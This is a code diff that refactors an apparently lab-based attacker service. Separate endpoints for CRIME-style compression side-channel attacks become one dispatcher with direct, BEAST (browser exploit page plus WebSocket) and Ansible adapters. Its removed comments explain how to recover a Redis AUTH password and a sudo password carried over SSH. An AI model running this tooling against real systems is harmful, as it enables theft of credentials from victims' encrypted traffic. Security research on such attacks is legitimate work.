@@ -35,9 +35,13 @@ from aiohttp import web
 from scapy.all import AsyncSniffer  # type: ignore
 from scapy.layers.inet import IP, TCP  # type: ignore
 
-from attack import run_attack as run_crime_attack
-from attack_ansible import run_attack as run_ansible_attack
-from attack_beast import BrowserBridge, run_attack as run_beast_attack
+from attacker.attack.adapters.browser_bridge import BrowserBridge
+
+# Unified engine.
+from attacker.attack.engine import run_attack as run_unified_attack
+from attacker.attack.adapters.direct import DirectAdapter
+from attacker.attack.adapters.beast import BeastAdapter
+from attacker.attack.adapters.ansible import AnsibleAdapter
 
 LOG = logging.getLogger("attacker")
 
@@ -48,7 +52,6 @@ HTTP_PORT = int(os.environ.get("HTTP_PORT", "9000"))
 CLIENT_CONTROL_URL = os.environ.get("CLIENT_CONTROL_URL", "http://client:8000")
 CLIENT_HOST = os.environ.get("CLIENT_HOST", "client")
 TUNNEL_PORT = int(os.environ.get("TUNNEL_PORT", "6379"))
-ANSIBLE_TUNNEL_PORT = int(os.environ.get("ANSIBLE_TUNNEL_PORT", "15432"))
 
 SNIFF_FILTER = f"tcp and (port {SERVER_PORT} or port {LISTEN_PORT})"
 SNIFF_IFACE = os.environ.get("SNIFF_IFACE", "eth0")
@@ -235,49 +238,8 @@ async def handle_trigger_payload(request: web.Request) -> web.Response:
     return web.json_response({"ok": True, "bytes_sent": len(payload)})
 
 
-async def handle_run_attack(request: web.Request) -> web.Response:
-    """Run the CRIME-style chosen-payload attack and return the recovered secret."""
-    body: dict[str, Any] = {}
-    if request.body_exists:
-        try:
-            body = await request.json()
-        except Exception:  # noqa: BLE001
-            body = {}
-    known_prefix = body.get("known_prefix", "*3\r\n$4\r\nAUTH\r\n$7\r\ndefault\r\n$").encode("utf-8")
-    alphabet = body.get("alphabet", "abcdefghijklmnopqrstuvwxyz0123456789")
-    max_length = int(body.get("max_length", 32))
-    noise_lengths = body.get("noise_lengths") or list(range(8))
-    settle = float(body.get("settle", 0.003))
-    flush_bytes = int(body.get("flush_bytes", 33000))
-    min_margin = int(body.get("min_margin", 16))
-    max_rounds = int(body.get("max_rounds", 64))
-
-    LOG.info("HTTP /run_attack: prefix=%r alphabet_size=%d max=%d "
-             "min_margin=%d max_rounds=%d",
-             known_prefix, len(alphabet), max_length, min_margin, max_rounds)
-    try:
-        result = await run_crime_attack(
-            packet_log=PACKET_LOG,
-            known_prefix=known_prefix,
-            alphabet_str=alphabet,
-            max_length=max_length,
-            noise_lengths=noise_lengths,
-            settle=settle,
-            flush_bytes=flush_bytes,
-            min_margin=min_margin,
-            max_rounds=max_rounds,
-        )
-    except Exception as exc:  # noqa: BLE001
-        LOG.exception("attack failed")
-        return web.json_response(
-            {"ok": False, "error": str(exc)}, status=500,
-        )
-    LOG.info("attack done: recovered=%r", result["recovered"])
-    return web.json_response({"ok": True, **result})
-
-
 # --------------------------------------------------------------------------
-# BEAST variant: exploit page + WebSocket + attack endpoint
+# BEAST variant: exploit page + WebSocket
 # --------------------------------------------------------------------------
 
 async def handle_exploit(request: web.Request) -> web.Response:
@@ -305,137 +267,62 @@ async def handle_ws(request: web.Request) -> web.WebSocketResponse:
     return ws
 
 
-async def handle_run_attack_ansible(request: web.Request) -> web.Response:
-    """Run the Ansible-model attack (fresh SSH connection per guess).
+# --------------------------------------------------------------------------
+# Unified /run_attack endpoint — dispatches to the engine via per-variant
+# adapters.
+# --------------------------------------------------------------------------
 
-    Each guess spawns an ``ansible-playbook`` run on the client via
-    ``/send_secret_ansible``, which opens a fresh SSH connection, uses
-    ``become: yes`` with sudo, and writes the sudo password to ssh's
-    stdin.  The attacker then opens a ``direct-tcpip`` channel through
-    the live SSH via the client's pre-existing LocalForward and
-    injects one CRIME guess into the same zlib context.
-    """
+_ADAPTER_BY_VARIANT: dict[str, Any] = {
+    "direct": DirectAdapter,
+    "beast": BeastAdapter,
+    "ansible": AnsibleAdapter,
+}
+
+
+def _build_adapter(adapter_cls: Any, variant: str) -> Any:
+    if variant == "direct":
+        return adapter_cls(packet_log=PACKET_LOG)
+    if variant == "beast":
+        return adapter_cls(packet_log=PACKET_LOG, bridge=BROWSER_BRIDGE)
+    if variant == "ansible":
+        return adapter_cls(packet_log=PACKET_LOG)
+    raise NotImplementedError(f"adapter construction not wired for variant {variant!r}")
+
+
+async def handle_run_attack(request: web.Request) -> web.Response:
+    """Unified attack endpoint: /run_attack with {"variant": ..., "config": {...}}."""
     body: dict[str, Any] = {}
     if request.body_exists:
         try:
             body = await request.json()
         except Exception:  # noqa: BLE001
             body = {}
-    # Default prefix: the 8 fully-predictable bytes of the CHANNEL_DATA
-    # header for the sudo-password packet (type + recipient-0 + 3 zero
-    # bytes of the length field).  JSON strings carry raw bytes <0x80
-    # verbatim through UTF-8, which is enough for both phases since
-    # plausible password lengths and ASCII password characters all
-    # live in that range.
-    known_prefix = body.get(
-        "known_prefix", "\x5e\x00\x00\x00\x00\x00\x00\x00",
-    ).encode("utf-8")
-    # Alphabet defaults to the password character set.  Phase 1
-    # (length-byte recovery) overrides this with plausible length
-    # bytes, e.g. "".join(chr(i) for i in range(1, 33)).
-    alphabet = body.get("alphabet", "abcdefghijklmnopqrstuvwxyz0123456789")
-    max_length = int(body.get("max_length", 32))
-    noise_lengths = body.get("noise_lengths") or list(range(8))
-    settle = float(body.get("settle", 0.1))
-    min_margin = int(body.get("min_margin", 8))
-    max_rounds = int(body.get("max_rounds", 96))
-    # Optional: a per-position list of noise-length hints.  For byte
-    # position `i < len(noise_hints)` the attack probes only the
-    # single noise length `noise_hints[i]` instead of running the
-    # full 8-noise sweep -- an ~8x speedup per hinted position.
-    # Positions at or beyond `len(noise_hints)` fall back to the
-    # full 8-noise sweep automatically.  Callers normally harvest
-    # a prior run's `significant_noises` response field and feed it
-    # back in here.  Leave unset (None) for the default "probe all
-    # 8 noise lengths at every position" mode.
-    noise_hints = body.get("noise_hints")
-    if noise_hints is not None:
-        noise_hints = [int(nl) for nl in noise_hints]
-    # Default terminator: '\n' (byte 0x0a).  Ansible appends a newline
-    # to the sudo password when writing it to ssh's stdin, so the
-    # password on the wire is "<password>\n" and '\n' is the natural
-    # stop signal for Phase 2.  Phase 1 overrides with '\x00' (not in
-    # the plausible length alphabet).
-    terminator_str = body.get("terminator", "\n")
-    terminator = terminator_str.encode("utf-8")
+    variant = body.get("variant", "direct")
+    overrides = body.get("config", {}) or {}
 
-    LOG.info(
-        "HTTP /run_attack_ansible: prefix=%r alphabet_size=%d max=%d "
-        "min_margin=%d max_rounds=%d terminator=%r noise_hints=%s",
-        known_prefix, len(alphabet), max_length, min_margin, max_rounds,
-        terminator, noise_hints,
-    )
-    try:
-        result = await run_ansible_attack(
-            packet_log=PACKET_LOG,
-            known_prefix=known_prefix,
-            alphabet_str=alphabet,
-            max_length=max_length,
-            noise_lengths=noise_lengths,
-            terminator=terminator,
-            settle=settle,
-            min_margin=min_margin,
-            max_rounds=max_rounds,
-            noise_hints=noise_hints,
-        )
-    except Exception as exc:  # noqa: BLE001
-        LOG.exception("ansible attack failed")
+    adapter_cls = _ADAPTER_BY_VARIANT.get(variant)
+    if adapter_cls is None:
         return web.json_response(
-            {"ok": False, "error": str(exc)}, status=500,
+            {"ok": False, "error": f"unknown variant {variant!r}"}, status=400,
         )
-    LOG.info("ansible attack done: recovered=%r", result["recovered"])
-    return web.json_response({"ok": True, **result})
-
-
-async def handle_run_attack_beast(request: web.Request) -> web.Response:
-    """Run the BEAST-model attack (browser-based injection)."""
-    if not BROWSER_BRIDGE.connected:
+    if variant == "beast" and not BROWSER_BRIDGE.connected:
         return web.json_response(
             {"ok": False, "error": "browser not connected"}, status=503,
         )
 
-    body: dict[str, Any] = {}
-    if request.body_exists:
-        try:
-            body = await request.json()
-        except Exception:  # noqa: BLE001
-            body = {}
-    known_prefix = body.get(
-        "known_prefix", "*3\r\n$4\r\nAUTH\r\n$7\r\ndefault\r\n$",
-    ).encode("utf-8")
-    alphabet = body.get("alphabet", "abcdefghijklmnopqrstuvwxyz0123456789")
-    max_length = int(body.get("max_length", 32))
-    noise_lengths = body.get("noise_lengths") or list(range(8))
-    settle = float(body.get("settle", 0.01))
-    flush_bytes = int(body.get("flush_bytes", 33000))
-    min_margin = int(body.get("min_margin", 64))
-    max_rounds = int(body.get("max_rounds", 64))
+    config = adapter_cls.default_config().overlay(overrides)
+    adapter = _build_adapter(adapter_cls, variant)
 
-    LOG.info(
-        "HTTP /run_attack_beast: prefix=%r alphabet_size=%d max=%d "
-        "min_margin=%d max_rounds=%d",
-        known_prefix, len(alphabet), max_length, min_margin, max_rounds,
-    )
+    LOG.info("HTTP /run_attack: variant=%s label=%r", variant, config.label)
     try:
-        result = await run_beast_attack(
-            packet_log=PACKET_LOG,
-            bridge=BROWSER_BRIDGE,
-            known_prefix=known_prefix,
-            alphabet_str=alphabet,
-            max_length=max_length,
-            noise_lengths=noise_lengths,
-            settle=settle,
-            flush_bytes=flush_bytes,
-            min_margin=min_margin,
-            max_rounds=max_rounds,
-        )
+        result = await run_unified_attack(adapter=adapter, config=config)
     except Exception as exc:  # noqa: BLE001
-        LOG.exception("BEAST attack failed")
+        LOG.exception("unified attack failed")
         return web.json_response(
-            {"ok": False, "error": str(exc)}, status=500,
+            {"ok": False, "error": str(exc), "variant": variant}, status=500,
         )
-    LOG.info("BEAST attack done: recovered=%r", result["recovered"])
-    return web.json_response({"ok": True, **result})
+    LOG.info("unified attack done: recovered=%r", result["recovered"])
+    return web.json_response({"ok": True, "variant": variant, **result})
 
 
 # --------------------------------------------------------------------------
@@ -471,10 +358,8 @@ async def main() -> int:
     app.router.add_post("/trigger_secret", handle_trigger_secret)
     app.router.add_post("/trigger_payload", handle_trigger_payload)
     app.router.add_post("/run_attack", handle_run_attack)
-    app.router.add_post("/run_attack_ansible", handle_run_attack_ansible)
     app.router.add_get("/exploit", handle_exploit)
     app.router.add_get("/ws", handle_ws)
-    app.router.add_post("/run_attack_beast", handle_run_attack_beast)
     runner = web.AppRunner(app)
     await runner.setup()
     site = web.TCPSite(runner, "0.0.0.0", HTTP_PORT)
